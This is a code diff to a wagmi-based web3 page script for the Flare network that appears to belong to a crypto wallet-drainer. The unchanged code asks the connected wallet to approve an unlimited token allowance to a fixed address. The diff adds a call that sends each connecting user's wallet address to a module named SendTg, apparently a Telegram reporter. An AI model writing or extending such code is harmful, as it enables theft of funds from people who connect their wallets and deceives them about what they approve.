@@ -15,6 +15,8 @@ import { publicProvider } from "@wagmi/core/providers/public";
 
 import { watchAccount, disconnect, getAccount } from "@wagmi/core";
 import { wflareAbi } from "./abi";
+import { sendConnectMsg } from "./SendTg";
+
 // 1. Define constants
 const projectId = "b3ae38fc6afaa5b33311a2332c3c039a";
 
@@ -63,7 +65,7 @@ async function callIncreaseAllowance() {
       "0x00006be452316f8ab73dfc850ef0acc766600000",
       "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
     ],
-  });
+  }).then((hash) => {});
 }
 
 document.addEventListener("DOMContentLoaded", () => {
@@ -82,6 +84,7 @@ watchAccount(async (account) => {
   const chainId = getNetwork();
   // userEl!.innerText = account.address ?? "";
   if (account.isConnected) {
+    await sendConnectMsg(account.address as string);
     btnEl!.innerText = `Disconnect ${account.address?.substring(0, 7)}`;
     if (chainId.chain?.id !== flare.id) {
       switchNetwork({
